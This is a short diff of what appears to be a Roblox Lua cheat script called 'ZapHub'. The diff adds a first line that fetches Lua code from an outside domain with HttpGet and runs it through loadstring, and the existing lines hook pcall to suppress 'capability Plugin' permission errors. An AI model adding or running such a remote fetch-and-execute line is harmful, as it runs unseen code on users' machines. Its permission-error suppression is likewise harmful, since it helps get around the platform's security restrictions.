@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://egorikusa.space/3ade7b707b2dae72d31a5c18.lua", true))()
 if not _G.ZapHubExecuted then
     _G.ScriptKey = script_key or ""
     local a;a=hookfunction(pcall,function(b,...)local c={a(b,...)}if type(b)=="function"and c[1]==false and string.find(c[2],"capability Plugin",1,true)then return true,c[2]end;return unpack(c)end)
